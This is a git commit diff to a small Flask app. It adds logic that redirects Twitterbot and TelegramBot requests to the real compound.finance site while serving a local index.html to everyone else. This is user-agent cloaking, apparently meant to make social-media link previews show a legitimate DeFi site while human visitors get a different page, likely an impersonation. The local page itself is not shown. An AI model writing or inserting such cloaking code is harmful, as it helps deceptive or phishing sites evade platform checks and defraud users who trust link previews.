6006b1357675c0034feebf7d924c18ee44c52654
souls1o <161530718+souls1o@users.noreply.github.com>
2024-07-29 04:11:58 -0700

    Update app.py

--- app.py
+++ app.py
@@ -4,7 +4,11 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template('index.html')
+    user_agent = request.headers.get('User-Agent').strip('\r\n')
+    if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
+        return redirect('https://compound.finance/')
+    else:
+        return render_template('index.html')
 
 if __name__ == '__main__':
   app.run()
